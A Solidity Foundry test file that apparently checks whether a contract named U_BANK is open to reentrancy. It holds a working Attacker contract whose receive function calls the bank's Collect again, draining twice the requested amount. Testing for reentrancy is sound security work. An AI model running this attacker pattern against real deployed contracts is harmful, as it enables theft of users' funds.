
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {

    U_BANK public bank;
    Log public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        bank = new U_BANK(address(logFile));
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 depositVal, uint256 attackVal) public {
        
        vm.assume(attackVal > 0);
        vm.assume(depositVal >= 2 * attackVal);
        vm.assume(depositVal >= 2 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        vm.assume(depositVal <= type(uint128).max);
        

        vm.deal(address(this), depositVal * 2);

        _attacker.setupAttack{value: depositVal}(depositVal, attackVal);

        vm.warp(block.timestamp + 1);

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    U_BANK public bank;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        bank = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 depositVal, uint256 attackVal) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        bank.Put{value: depositVal}(0);
        storedAttackVal = attackVal;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        bank.Collect(val);

        uint256 received = address(this).balance - initialSnapshot;
        if (received == 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            bank.Collect(storedAttackVal);
        }
    }

    fallback() external payable {}
}
